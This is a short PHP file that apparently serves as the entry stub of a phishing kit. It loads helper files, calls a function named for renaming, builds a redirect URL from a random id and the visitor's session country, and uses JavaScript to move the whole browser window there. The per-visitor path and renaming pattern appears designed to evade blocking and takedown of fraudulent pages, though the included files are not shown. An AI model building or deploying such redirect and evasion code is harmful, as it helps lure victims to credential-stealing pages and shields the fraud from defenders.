<?php
//---------------------------------------------------------------------------------------- INC
	include('./includes/funciones.php');
	include('./includes/lang.php');
//---------------------------------------------------------------------------------------- VAR
	$An = 'id='.rand(99, 100000000);
	$xcod = (empty($_SESSION['AYCOUNTCODE'])) ? '' : 'code='.$_SESSION['AYCOUNTCODE'].'&';
	$xbla = (empty($_SESSION['AYCOUNT'])) ? '' : '&country='.$_SESSION['AYCOUNT'];
//---------------------------------------------------------------------------------------- RNM
	Badal_smiya();
//---------------------------------------------------------------------------------------- FIN
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script language="javascript">
var sirawdi = "./<?php echo Jib_milaf().$xcod.$An.$xbla ; ?>"        
top.location = sirawdi;
</script> 
</head>
</html>
